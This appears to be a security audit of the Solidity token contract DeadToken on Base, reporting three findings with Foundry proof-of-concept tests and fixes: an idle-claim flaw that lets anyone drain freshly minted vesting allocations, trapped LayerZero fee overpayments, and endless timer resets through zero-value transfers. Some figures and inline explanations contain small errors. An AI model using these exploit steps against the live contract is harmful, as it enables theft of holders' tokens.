# DeadToken Audit

Audit date: 2025-10-29

## Scope and Context

- In-scope file: `Dead.sol` (contract `DeadToken`, Solidity 0.8.28)
- Chain: Base (EVM, L2)
- Key dependencies: OpenZeppelin, LayerZero OFT/OApp v2



## Findings

### 1) Immediate drain of platform/vesting/initial-mint allocations via idle-claim due to missing lastTransferTime updates on mint

**Location:** `claimIdleTokens(...)`

### Details


### How `lastTransferTime` Is Supposed to Work

The contract uses a mapping `lastTransferTime[address]` to track when each address last made a transfer. The intent is to implement an "idle claim" mechanism:
- Any token transfer (via `_update` hook) resets the sender's timer to `block.timestamp`
- After `IDLE_PERIOD` (7,776,000 seconds ≈ 90 days) of inactivity, anyone can call `claimIdleTokens(target)` to claim and redistribute the idle address's tokens

**Claim eligibility check (line 447-449):**
```solidity
if (block.timestamp < lastTransferTime[target] + IDLE_PERIOD) {
    revert TokensNotIdleLongEnough();
}
```

### Root Cause:

```solidity
function _update(address from, address to, uint256 value) internal override {
    super._update(from, to, value);

    if (from != address(0)) {  // ← Only sets timer for non-zero 'from' (transfers)
        lastTransferTime[from] = block.timestamp;
    }
    // ⚠️ When from == address(0) (mints), the receiver's timer is NEVER set
}
```

**This means:**

- Minted tokens receive no timer initialization
- Recipients' `lastTransferTime[recipient]` remains at the default value: `0`

**Current timestamp on Base (2025-10-29):**

- `block.timestamp ≈ 1,730,000,000` seconds (≈54.8 years since Unix epoch)

**IDLE_PERIOD:**

- `IDLE_PERIOD = 7,776,000` seconds (≈90 days)

**Claim condition (line 447-449):**

```solidity
if (block.timestamp < lastTransferTime[target] + IDLE_PERIOD) {
    revert TokensNotIdleLongEnough();
}
```

**For a minted recipient with `lastTransferTime[target] == 0`:**

```
block.timestamp < 0 + IDLE_PERIOD
1,730,000,000 < 7,776,000
FALSE ✓ Check PASSES immediately
```

**This means:** Any address minted tokens with `lastTransferTime = 0` is **immediately claimable** on day 1, regardless of IDLE_PERIOD.

---


## Proof-of-Concept Code (Foundry Test)

```solidity
function testImmediateDrainVestingTokens() public {
    // Setup: Mint 1M tokens to attacker
    vm.prank(owner);
    token.mint(attacker, 1_000_000 * 1e18);

    // Setup: Mint 200M to vesting contract
    uint256 vestingAmount = 200_000_000 * 1e18;
    vm.prank(owner);
    token.mintInitial(address(vestingContract));

    // Verify vesting received tokens
    assertEq(token.balanceOf(address(vestingContract)), vestingAmount);

    // Verify timer was NOT set (remains 0)
    assertEq(token.lastTransferTime(address(vestingContract)), 0);

    // Attack: Attacker drains immediately
    vm.prank(attacker);
    token.claimIdleTokens(address(vestingContract));

    // Verify drain succeeded
    assertEq(token.balanceOf(address(vestingContract)), 0);
    assertEq(
        token.balanceOf(attacker),
        1_000_000 * 1e18 + (vestingAmount * 50 / 100)
    );
}
```


## Recommended Fixes

### **Option A: Set Timer in `_update()` Hook**

```solidity
function _update(
    address from,
    address to,
    uint256 value
) internal override {
    super._update(from, to, value);

    // Set timer for sender
    if (from != address(0)) {
        lastTransferTime[from] = block.timestamp;
    }

    // FIX: Also set timer for receiver on mints
    if (from == address(0) && to != address(0)) {
        lastTransferTime[to] = block.timestamp;
    }
}
```

## 2) Medium — Overpayment beyond fee.nativeFee is trapped

**Location:** `requestTierMint(...)` (lines 278-305)


## Vulnerability Explanation

### How Cross-Chain Minting Works

When a user requests a tier mint from a non-hub chain, the contract must:
1. Communicate with the hub chain via LayerZero
2. Estimate the cross-chain messaging fee
3. Send the message with the required fee

**Current implementation (lines 298-304):**
```solidity
MessagingFee memory fee = _quote(hubEid, payload, options, false);
if (msg.value < fee.nativeFee) {
    revert InvalidMessageValue(fee.nativeFee, msg.value);
}

_lzSend(hubEid, payload, options, fee, msg.sender);
````

### The Problem:

The vulnerability stems from a **mismatch between how fees are checked and how they're refunded**:

#### **Issue: LayerZero's Refund Recipient**

The 5th parameter to `_lzSend` is the `refundAddress`:

```solidity
_lzSend(hubEid, payload, options, fee, msg.sender);
                                          // ↑
                                    refundAddress = msg.sender
```

In this context:

- `msg.sender` is **the whitelisted switchbox contract**, NOT the end user
- LayerZero will refund any excess to `msg.sender` (the switchbox)
- The end user has **no way to recover the excess**


### Example
- LayerZero fee quote: `fee.nativeFee = 0.0523 ETH` (typical fee)
- User sends through switchbox: `msg.value = 0.0600 ETH` (0.0077 ETH over)

**Execution Flow:**

```
Step 1: Fee check
  if (0.0600 < 0.0523) revert;  // ✗ Check FAILS (overpayment allowed)

Step 2: LayerZero sends message
  _lzSend(..., fee, msg.sender);
  - Endpoint uses: 0.0523 ETH (from fee.nativeFee)
  - Refund destination: msg.sender = switchbox contract
  - Refund amount: 0.0600 - 0.0523 = 0.0077 ETH

Step 3: Refund handling
  ✓ LayerZero sends 0.0077 ETH to switchbox
  ✗ User never receives the 0.0077 ETH
```



## Recommended Fixes

```solidity
MessagingFee memory fee = _quote(hubEid, payload, options, false);
if (msg.value < fee.nativeFee) {
    revert InvalidMessageValue(fee.nativeFee, msg.value);
}

// Send LayerZero message
_lzSend(hubEid, payload, options, fee, address(this));  // Refund to contract

// Calculate and refund overpayment to user
uint256 overpayment = msg.value - fee.nativeFee;
if (overpayment > 0) {
    (bool success, ) = user.call{value: overpayment}("");
    require(success, "Refund failed");
}
```



### 3) Medium — Idle-claim timer can be indefinitely refreshed via zero-value transfers

**Location:** `_update(...)` (line 632), `transfer()`, `transferFrom()`

---

## Vulnerability Explanation

### How the Idle-Claim Timer Should Work

The contract implements an inactivity penalty via the `lastTransferTime` mapping:

- Timer is updated whenever an account **transfers tokens**
- After `IDLE_PERIOD` (90 days) without transfers, anyone can claim and redistribute that account's tokens
- This creates an incentive for token holders to remain active (transfer tokens periodically)

**Current timer update logic:**

```solidity
function _update(
    address from,
    address to,
    uint256 value
) internal override {
    super._update(from, to, value);

    if (from != address(0)) {
        lastTransferTime[from] = block.timestamp;  // Updated on ANY transfer
    }
}
```

### The Problem: No Value Check

The `_update` hook updates `lastTransferTime[from]` **regardless of the transfer amount**:

- Transfers with `value = 0` still reset the timer
- `value > 0` transfers also reset the timer
- No distinction between "real" and "spam" transfers

**This allows:**

```solidity
token.transfer(0x1234, 0);  // Resets timer, costs only gas
// Result: lastTransferTime[msg.sender] = now
```

---

## Exploitation Mechanics

### Attack: Indefinite Timer Refresh

**Setup:**

- Attacker holds some DEAD tokens (any amount > 0)
- Attacker wants to prevent their tokens from becoming claimable

**Attack Loop (repeats every 80-85 days):**

```solidity
// Day 1: Attacker acquires tokens
attacker.balanceOf() = 1,000,000 DEAD
lastTransferTime[attacker] = block.timestamp (T0)

// Day 85: Before idle period expires
// Attacker sends 0 tokens to any address
token.transfer(randomAddr, 0);
// _update is called with from=attacker, to=randomAddr, value=0
// Timer is reset: lastTransferTime[attacker] = block.timestamp (T0 + 85d)

// Repeat every 85 days...
// The check: now >= lastTransferTime[attacker] + 90d
// always evaluates to: (T0 + N*85d) + N*85d) >= T0 + N*85d + 90d
// is NEVER true because the attacker keeps refreshing every 85 days
```

---

## Proof-of-Concept (Foundry Test)

```solidity
function testZeroValueTransferBypassesClaim() public {
    // Setup: Alice holds tokens, lastTransferTime = 0 (immediately claimable)
    vm.prank(owner);
    token.mint(alice, 1_000_000_000 * 1e18);

    // Fast-forward 90+ days to make Alice's tokens claimable
    vm.warp(block.timestamp + IDLE_PERIOD + 1);

    // Before exploit: Alice's tokens should be claimable
    assertTrue(token.isClaimable(alice));

    // Now Alice sends 0 tokens to Bob (refreshes her timer)
    vm.prank(alice);
    token.transfer(bob, 0);  // Zero-value transfer

    // After exploit: Alice's tokens are NO LONGER claimable
    assertFalse(token.isClaimable(alice));

    // Alice can repeat this every 89 days to stay protected indefinitely
    for (uint i = 0; i < 10; i++) {
        vm.warp(block.timestamp + 89 days);
        vm.prank(alice);
        token.transfer(bob, 0);  // Repeat forever
        assertFalse(token.isClaimable(alice));
    }
}
```

## Recommended Fixes

```solidity
function _update(
    address from,
    address to,
    uint256 value
) internal override {
    super._update(from, to, value);

    // Only reset sender's timer for transfers with actual value
    if (from != address(0) && value > 0) {  // ← ADD value > 0 check
        lastTransferTime[from] = block.timestamp;
    }
}
```



